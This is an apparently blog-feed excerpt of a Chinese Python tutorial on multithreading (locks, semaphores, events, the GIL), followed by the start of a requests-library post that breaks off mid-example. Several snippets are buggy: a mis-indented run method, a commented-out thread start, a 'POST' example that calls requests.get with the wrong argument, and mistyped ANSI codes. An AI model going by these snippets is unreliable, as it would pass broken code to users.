    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-什么是多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是多线程font"></a> <font color="navy">0x00 什么是多线程？</font></h3><blockquote><p><font size="2">在计算机编程中，一个基本的概念就是同时对多个任务加以控制。许多程序设计问题都要求程序能够停下手头的工作，改为处理其他一些问题，再返回主进程。可以通过多种途径达到这个目的。最开始的时候，那些掌握机器低级语言的程序员编写一些“中断服务例程”，主进程的暂停是通过硬件级的中断实现的。尽管这是一种有用的方法，但编出的程序很难移植，由此造成了另一类的代价高昂问题。中断对那些实时性很强的任务来说是很有必要的。但对于其他许多问题，只要求将问题划分进入独立运行的程序片断中，使整个程序能更迅速地响应用户的请求。<br><strong>最开始，线程只是用于分配单个处理器的处理时间的一种工具。但假如操作系统本身支持多个处理器，那么每个线程都可分配给一个不同的处理器，真正进入“并行运算”状态</strong>。从程序设计语言的角度看，多线程操作最有价值的特性之一就是程序员不必关心到底使用了多少个处理器。程序在逻辑意义上被分割为数个线程;假如机器本身安装了多个处理器，那么程序会运行得更快，毋需作出任何特殊的调校。根据前面的论述，大家可能感觉线程处理非常简单。但必须注意一个问题：共享资源!如果有多个线程同时运行，而且它们试图访问相同的资源，就会遇到一个问题。举个例子来说，两个线程不能将信息同时发送给一台打印机。为解决这个问题，对那些可共享的资源来说(比如打印机)，它们在使用期间必须进入锁定状态。所以一个线程可将资源锁定，在完成了它的任务后，再解开(释放)这个锁，使其他线程可以接着使用同样的资源。<br>多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。<br>一个采用了多线程技术的应用程序可以更好地利用系统资源。其主要优势在于充分利用了CPU的空闲时间片，可以用尽可能少的时间来对用户的要求做出响应，使得进程的整体运行效率得到较大提高，同时增强了应用程序的灵活性。更为重要的是，由于同一进程的所有线程是共享同一内存，所以不需要特殊的数据传送机制，不需要建立共享存储区或共享文件，从而使得不同任务之间的协调操作与运行、数据的交互、资源的分配等问题更加易于解决。</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading <span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread <span class="keyword">import</span> time,os</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-python多线程详解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-python多线程详解font"></a> <font color="navy">0x01 python多线程详解</font></h3><h4 id="1什么是线程"><a class="markdownIt-Anchor" href="#1什么是线程"></a> 1.什么是线程？</h4><blockquote><p>线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。</p></blockquote><h4 id="2为什么要使用多线程"><a class="markdownIt-Anchor" href="#2为什么要使用多线程"></a> 2.为什么要使用多线程？</h4><p>线程在程序中是独立的、并发的执行流。与分隔的进程相比，进程中线程之间的隔离程度要小，它们共享内存、文件句柄    和其他进程应有的状态。因为线程的划分尺度小于进程，使得多线程程序的并发性高。进程在执行过程之中拥有独立的内存单元，而多个线程共享内存，从而极大的提升了程序的运行效率。</p><p>线程比进程具有更高的性能，这是由于同一个进程中的线程都有共性，多个线程共享一个进程的虚拟空间。线程的共享环境包括进程代码段、进程的共有数据等，利用这些共享的数据，线程之间很容易实现通信。操作系统在创建进程时，必须为改进程分配独立的内存空间，并分配大量的相关资源，但创建线程则简单得多。因此，使用多线程 来实现并发比使用多进程的性能高得要多。</p><blockquote><p>总结起来，使用多线程编程具有如下几个优点：</p><ul><li>进程之间不能共享内存，但线程之间共享内存非常容易。</li><li>操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此使用多线程来实现多任务并发执行比使用多进程的效率高 。</li><li>python语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了python的多线程编程。</li></ul></blockquote><h4 id="3普通创建方式"><a class="markdownIt-Anchor" href="#3普通创建方式"></a> 3.普通创建方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'0s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=run,args=(<span class="string">'t1'</span>,))     <span class="comment"># target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在</span></span><br><span class="line">    t2 = threading.Thread(target=run,args=(<span class="string">'t2'</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="4自定义线程"><a class="markdownIt-Anchor" href="#4自定义线程"></a> 4.自定义线程</h4><blockquote><p>继承threading.Thread来定义线程类，其本质是重构Thread类中的run方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n)</span>:</span></span><br><span class="line">        super(MyThread,self).__init__()   <span class="comment">#重构run函数必须写</span></span><br><span class="line">        self.n = n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'task'</span>,self.n)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'2s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'1s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'0s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = MyThread(<span class="string">'t1'</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">'t2'</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="5守护线程"><a class="markdownIt-Anchor" href="#5守护线程"></a> 5.守护线程</h4><p>下面这个例子，这里使用setDaemon(True)把所有的子线程都变成了主线程的守护线程，因此当主线程结束后&lt;子线程也会随之结束，所以当主线程结束后，整个程序就退出了。</p><blockquote><p>所谓’线程守护’，就是主线程不管该线程的执行情况，只要是其他子线程结束且主线程执行完毕，主线程都会关闭。也就是说:主线程不等待该守护线程的执行完再去关闭。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>通过执行结果可以看出，设置守护线程之后，当主线程结束时，子线程也将立即结束，不再执行 ‘’’ ‘’’</p></blockquote><h4 id="6主线程等待子线程结束"><a class="markdownIt-Anchor" href="#6主线程等待子线程结束"></a> 6.主线程等待子线程结束</h4><p>为了让守护线程执行结束之后，主线程再结束，我们可以使用join方法，让主线程等待子线程执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'5s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)    <span class="comment">#把子线程设置为守护线程，必须在start()之前设置</span></span><br><span class="line">    t.start()</span><br><span class="line">    t.join()     <span class="comment">#设置主线程等待子线程结束</span></span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><h4 id="7多线程共享全局变量"><a class="markdownIt-Anchor" href="#7多线程共享全局变量"></a> 7.多线程共享全局变量</h4><p>线程时进程的执行单元，进程时系统分配资源的最小执行单位，所以在同一个进程中的多线程是共享资源的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">g_num = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span>  g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        g_num+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'in work1 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    print(<span class="string">'in work2 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=work1)</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    t2=threading.Thread(target=work2)</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，当多个线程同时修改同一条数据时可能会出现脏数据，    所以出现了线程锁，即同一时刻允许一个线程执行操作。线程锁用于锁定资源，可以定义多个锁，像下面的代码，当需要独占    某一个资源时，任何一个锁都可以锁定这个资源，就好比你用不同的锁都可以把这个相同的门锁住一样。  由于线程之间是进行随机调度的，如果有多个线程同时操作一个对象，如果没有很好地保护该对象，会造成程序结果的不可预期， 我们因此也称为“线程不安全”。 为了防止上面情况的发生，就出现了互斥锁（Lock）</p><h4 id="8互斥锁lock"><a class="markdownIt-Anchor" href="#8互斥锁lock"></a> 8.互斥锁（Lock）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    lock.acquire()</span><br><span class="line">    temp = n</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    n = temp<span class="number">-1</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line">    n = <span class="number">100</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        p = Thread(target=work)</span><br><span class="line">        l.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h4 id="9递归锁"><a class="markdownIt-Anchor" href="#9递归锁"></a> 9.递归锁</h4><p>RLcok类的用法和Lock类一模一样，但它支持嵌套，在多个锁没有释放的时候一般会使用RLock类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(lock)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    lock.acquire()</span><br><span class="line">    gl_num += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(gl_num)</span><br><span class="line">    lock.release()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gl_num = <span class="number">0</span></span><br><span class="line">    lock = threading.RLock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=func,args=(lock,))</span><br><span class="line"><span class="comment">#         t.start()</span></span><br></pre></td></tr></table></figure><h4 id="10信号量boundedsemaphore类"><a class="markdownIt-Anchor" href="#10信号量boundedsemaphore类"></a> 10.信号量（BoundedSemaphore类）</h4><p>互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据，比如厕所有3个坑，那最多只允许3个人上厕所，后面的人只能等里面有人出来了才能再进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n,semaphore)</span>:</span></span><br><span class="line">    semaphore.acquire()   <span class="comment">#加锁</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'run the thread:%s\n'</span> % n)</span><br><span class="line">    semaphore.release()    <span class="comment">#释放</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    semaphore = threading.BoundedSemaphore(<span class="number">5</span>)   <span class="comment">#最多允许5个线程同时运行</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        t = threading.Thread(target=run,args=(<span class="string">'t-%s'</span> % i,semaphore))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'----------all threads done-----------'</span>)</span><br></pre></td></tr></table></figure><h4 id="11事件"><a class="markdownIt-Anchor" href="#11事件"></a> 11.事件</h4><p>python线程的事件用于主线程控制其他线程的执行，事件是一个简单的线程同步对象，其主要提供以下的几个方法：</p><ul><li>clear将flag设置为 False</li><li>set将flag设置为 True</li><li>is_set判断是否设置了flag</li><li>wait会一直监听flag，如果没有检测到flag就一直处于阻塞状态</li></ul><p>事件处理的机制：全局定义了一个Flag，当Flag的值为False，那么event.wait()就会阻塞，当flag值为True，那么event.wait()便不再阻塞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">event = threading.Event()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lighter</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    event.set()         <span class="comment">#初始者为绿灯</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> &lt; count &lt;=<span class="number">10</span>:</span><br><span class="line">            event.clear()  <span class="comment">#红灯，清除标志位</span></span><br><span class="line">            print(<span class="string">"\33[41;lmred light is on...\033[0m]"</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; <span class="number">10</span>:</span><br><span class="line">            event.set()    <span class="comment">#绿灯，设置标志位</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\33[42;lmgreen light is on...\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">car</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.is_set():     <span class="comment">#判断是否设置了标志位</span></span><br><span class="line">            print(<span class="string">'[%s] running.....'</span>%name)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[%s] sees red light,waiting...'</span>%name)</span><br><span class="line">            event.wait()</span><br><span class="line">            print(<span class="string">'[%s] green light is on,start going...'</span>%name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># startTime = time.time()</span></span><br><span class="line">light = threading.Thread(target=lighter,)</span><br><span class="line">light.start()</span><br><span class="line"></span><br><span class="line">car = threading.Thread(target=car,args=(<span class="string">'MINT'</span>,))</span><br><span class="line">car.start()</span><br><span class="line">endTime = time.time()</span><br><span class="line"><span class="comment"># print('用时：',endTime-startTime)</span></span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-gil-全局解释器-font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-gil-全局解释器-font"></a> <font color="navy">0x02 GIL  全局解释器 </font></h3><blockquote><p>在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核        同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。GIL的全程是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在cpython中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。而在pypy和jpython中是没有GIL的python在使用多线程的时候，调用的是c语言的原生过程。</p></blockquote><p>python针对不同类型的代码执行效率也是不同的：</p><ol><li><p>CPU密集型代码（各种循环处理、计算等），在这种情况下，由于计算工作多，ticks技术很快就会达到阀值，然后出发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。</p></li><li><p>IO密集型代码（文件处理、网络爬虫等设计文件读写操作），多线程能够有效提升效率（单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序的执行 效率）。所以python的多线程对IO密集型代码比较友好。 ‘’’ ‘’’</p></li></ol><blockquote><p>主要要看任务的类型，我们把任务分为I/O密集型和计算密集型，而多线程在切换中又分为I/O切换和时间切换。如果任务属于是I/O密集型，    若不采用多线程，我们在进行I/O操作时，势必要等待前面一个I/O任务完成后面的I/O任务才能进行，在这个等待的过程中，CPU处于等待    状态，这时如果采用多线程的话，刚好可以切换到进行另一个I/O任务。这样就刚好可以充分利用CPU避免CPU处于闲置状态，提高效率。但是    如果多线程任务都是计算型，CPU会一直在进行工作，直到一定的时间后采取多线程时间切换的方式进行切换线程，此时CPU一直处于工作状态，    此种情况下并不能提高性能，相反在切换多线程任务时，可能还会造成时间和资源的浪费，导致效能下降。这就是造成上面两种多线程结果不能的解释。</p></blockquote><p><strong>结论</strong>：<font color="red">I/O密集型任务，建议采取多线程，还可以采用多进程+协程的方式(例如:爬虫多采用多线程处理爬取的数据)；对于计算密集型任务，python此时就不适用了。</font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-什么是多线程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-什么是多线程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;0x00 什么是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python库总结</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88148%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（148）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-23T06:11:17.886Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-colornavy0x00-导入库的的方式font"><a class="markdownIt-Anchor" href="#font-colornavy0x00-导入库的的方式font"></a> <font color="navy">0x00 导入库的的方式</font></h3><h4 id="1import-module"><a class="markdownIt-Anchor" href="#1import-module"></a> 1.import module</h4><p><code>核心笔记</code></p><blockquote><p>import语句的模块顺序：最好按照如下顺序：</p><ul><li>Python标准库模块</li><li>Python第三方库文件</li><li>应用程序自定义模块</li></ul></blockquote><p><code>使用函数</code></p><blockquote><p>module.function()</p></blockquote><h4 id="2from-module-import"><a class="markdownIt-Anchor" href="#2from-module-import"></a> 2.from module import *</h4><p><code>使用方法</code></p><blockquote><p>function()</p></blockquote><p><code>核心笔记</code></p><blockquote><p>在实践中，认为“import module import *”不是很好的编程风格，因为它“污染”当前名称空间，而且很可能覆盖当前名称空间中现有的名字；但如果某个模块有很多要经常访问的变量或者模块的名字很长，这也不失为一个好办法</p></blockquote><h3 id="font-color-navy0x01-requests-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-requests-库font"></a> <font color="navy">0x01 requests 库</font></h3><blockquote><p><a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">相关链接</a></p></blockquote><h4 id="1发送请求"><a class="markdownIt-Anchor" href="#1发送请求"></a> 1.发送请求</h4><p><code>get 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">header = &#123;</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; '</span>,</span><br><span class="line">            <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数信息</span></span><br><span class="line">para = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies</span></span><br><span class="line">cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=header, params = para, allow_redirects=<span class="keyword">False</span>, cookies=cookies, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>post 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 除了参数信息的方式不一样外，其余信息和get一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, data=header, params = para, allow_redirects=<span class="keyword">False</span>, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>请求的参数</code></p><p><strong>① 参数</strong></p><blockquote><p>具体的可以看上面</p></blockquote><p><strong>② Cookies</strong></p><blockquote><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><blockquote><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p></blockquote><figure class="highlight 